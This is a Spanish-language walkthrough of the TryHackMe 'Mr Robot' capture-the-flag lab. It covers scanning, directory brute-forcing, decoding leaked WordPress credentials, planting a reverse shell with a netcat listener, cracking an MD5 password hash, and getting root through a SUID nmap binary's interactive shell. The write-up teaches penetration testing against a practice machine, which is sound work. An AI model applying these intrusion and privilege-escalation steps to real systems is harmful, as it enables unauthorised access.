---
title: "Mr Robot CTF::__. Tryhackme 🤖"
date: 2023-08-30T02:01:58+05:30
description: "Esta es una máquina virtual destinada para usuarios principiantes/intermedios. Hay 3 llaves ocultas ubicadas en la máquina, ¿puedes encontrarlas? "
tags: [tryhackme, medium, suid]
---


## Enumeración



```shell
$ nmap -p- -Pn -n --min-rate 2000 -vvv 10.10.9.68

Host is up, received user-set (0.34s latency).
Scanned at 2023-08-30 10:17:29 -05 for 67s
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE REASON
22/tcp  closed ssh     reset ttl 61
80/tcp  open   http    syn-ack ttl 61
443/tcp open   https   syn-ack ttl 61
```



Vemos que hay un servidor web ejecutándose. Entonces, mientras lo exploramos, ejecutemos un análisis Dirsearch para encontrar archivos y directorios ocultos. 


```bash
$ dirsearch -u http://10.10.9.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,cgi,bin,txt

```

* encontramos varios directorios entre ellos uno llamado `/robots` donde encontramos cosas

```
User-agent: *
fsocity.dic
key-1-of-3.txt

```  

abrimos `key-1-of-3.txt` y encontramos la primera flag 🤙

--------------------------------------------------------------

seguimos buscando directorios y encontramos uno `/license` al abrirlo encontramos un code en base64 
`ZWxsaW90OkVSMjgtMDY1Mgo=` lo desciframos

```
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

parecen ser unas credenciales y ya que la enumeración nos dio directorios de wordpress `/wp-login` probamos si sin las correctas. Y lo son !!!!


{{< figure src="https://i.imgur.com/9pqm4jo.png">}}

## Reverse shell

acá ya es solo inyectar un script malicioso para obtener la shell, en este caso usamos la ayuda de `pentestmonkey` y nos ponemos en escucha por el puerto: 1234

```shell
nc -nvlp 1234
```

y listo tenemos una shell!!!


{{< figure src="https://i.imgur.com/5MBkxbs.png">}}

## Escalada de privilegios

entramos a la carpeta `/home` y encontramos un usuario llamado `robot` miramos su contenido


{{< figure src="https://i.imgur.com/dzrbBFe.png">}}

* como vemos tenemos permisos de lectura en el archivo `password.raw-md5` lo revisamos

```
daemon@linux:/home/robot$ cat pass
robot:c3fcd3d76192e4007dfb496cca67e13b
```

usamos la web [Crackstation](https://crackstation.net/) para descifrar la contraseña

```
daemon@linux:/home/robot$ su -l robot
Password: 
$ ls
key-2-of-3.txt	password.raw-md5
$ whoami 
robot
```
## Acceso root

buscamos archivos `SUID` 

```
robot@linux:/$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
daemon@linux:/$ 


```

vemos el bin de `nmap` y damos un vistaso a [Gtobins](https://gtfobins.github.io/)

```
robot@linux:/$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root

```

¡Tenemos root! Ahora sólo nos falta conseguir el último 🔑:

```
cd /root
ls
firstboot_done	key-3-of-3.txt

```

Y listo pues. 🤠